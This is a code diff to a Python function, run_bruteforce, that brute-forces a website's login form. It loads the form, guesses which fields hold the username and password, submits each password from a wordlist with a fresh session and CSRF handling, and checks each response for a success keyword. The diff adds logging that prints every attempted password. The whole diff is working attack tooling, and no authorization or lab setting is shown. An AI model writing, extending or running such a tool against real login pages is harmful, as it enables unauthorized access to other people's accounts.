@@ -39,15 +39,25 @@ def run_bruteforce(
     username,
     wordlist_path,
     update_progress,
+    log_output,  # NEW: logs each attempt
     user_field_override=None,
     pass_field_override=None,
     success_keyword="welcome",
     delay=0,
 ):
-    """
-    Brute-force login form that handles CSRF tokens per attempt.
-    """
-    session = requests.Session()  # session is kept across attempts
+    session, action, method, form_data = get_login_form(login_url)
+    if None in (session, action, method, form_data):
+        return "[!] Error loading or parsing the login form."
+
+    username_field = user_field_override or next(
+        (k for k in form_data if "user" in k.lower()), None
+    )
+    password_field = pass_field_override or next(
+        (k for k in form_data if "pass" in k.lower()), None
+    )
+
+    if not username_field or not password_field:
+        return "[!] Could not identify login fields. Please provide field names."
 
     try:
         with open(wordlist_path, "r", encoding="latin-1") as f:
@@ -85,7 +95,10 @@ def run_bruteforce(
         try:
             response = session.post(full_action_url, data=form_data, timeout=10)
         except requests.RequestException:
-            continue  # skip failed attempt
+            log_output.markdown(f"❌ Attempt {i+1}/{total}: Network error")
+            continue
+
+        log_output.markdown(f"🔄 Attempt {i+1}/{total}: `{password}`")
 
         if success_keyword.lower() in response.text.lower():
             update_progress(100)
